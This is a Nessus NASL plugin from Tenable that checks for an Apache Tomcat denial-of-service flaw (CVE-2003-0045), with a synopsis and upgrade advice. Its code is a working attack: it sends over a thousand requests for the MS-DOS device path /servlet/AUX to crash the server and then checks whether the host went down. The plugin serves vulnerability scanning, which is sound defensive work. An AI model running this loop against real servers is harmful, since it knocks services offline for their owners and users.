#
# (C) Tenable network Security, Inc.
#

# See also script 10930 http_w98_devname_dos.nasl
#
# Vulnerable servers:
# Apache Tomcat 3.3
# Apache Tomcat 4.0.4
# All versions prior to 4.1.x may be affected as well.
# Apache Tomcat 4.1.10 (and probably higher) is not affected.
# 
# Microsoft Windows 2000
# Microsoft Windows NT may be affected as well.
#
# References:
# Date: Fri, 11 Oct 2002 13:36:55 +0200
# From:"Olaf Schulz" <olaf.schulz@t-systems.com>
# To:cert@cert.org, bugtraq@securityfocus.com, vulnwatch@vulnwatch.org
# Subject: Apache Tomcat 3.x and 4.0.x: Remote denial-of-service vulnerability
#


include("compat.inc");

if(description)
{
 script_id(11150);
 script_version("$Revision: 1.18 $");
 script_cve_id("CVE-2003-0045");
 script_xref(name:"OSVDB", value:"12233");

 script_name(english:"Apache Tomcat MS-DOS Device Name Request DoS");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote host has an application that is affected by a 
denial of service vulnerability." );
 script_set_attribute(attribute:"description", value:
"It was possible to freeze or crash Windows or the web server
by reading a thousand of times a MS/DOS device through Tomcat 
servlet engine, using a file name like /examples/servlet/AUX

A cracker may use this flaw to make your system crash 
continuously, preventing you from working properly." );
 script_set_attribute(attribute:"solution", value:
"Upgrade your Apache Tomcat web server to version 4.1.10." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P" );

script_end_attributes();

 script_summary(english:"Kills Apache Tomcat by reading 1000+ times a MS/DOS device through the servlet engine");
 script_category(ACT_KILL_HOST);
 script_copyright("This script is Copyright (C) 2002-2009 Tenable Network Security, Inc.");
 script_family(english: "Web Servers");
 script_dependencies("http_version.nasl");
 script_require_ports("Services/www", 80);
 script_require_keys("Settings/ParanoidReport");
 exit(0);
}

# The script code starts here

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

# Avoid false-positives.
if (report_paranoia < 2) exit(0);


start_denial();

port = get_http_port(default:80);

banner = get_http_banner(port:port);
if ("Tomcat" >!< banner && "Apache-Coyote" >!< banner)
  exit (0);

if (http_is_dead(port: port)) exit(0);
soc = http_open_socket(port);
if (! soc) exit(0);

# We should know where the servlets are
url = "/servlet/AUX";
 
for (i = 0; i <= 1000; i = i + 1)
{
  res = http_send_recv3(method:"GET", item:url, port:port);
  if (isnull(res))
  {
    sleep(1);
    res = http_send_recv3(method:"GET", item:url, port:port);
    if (isnull(res))
      break;
  }
}

alive = end_denial();
if (! alive && http_is_dead(port: port, retry: 3)) security_warning(port);
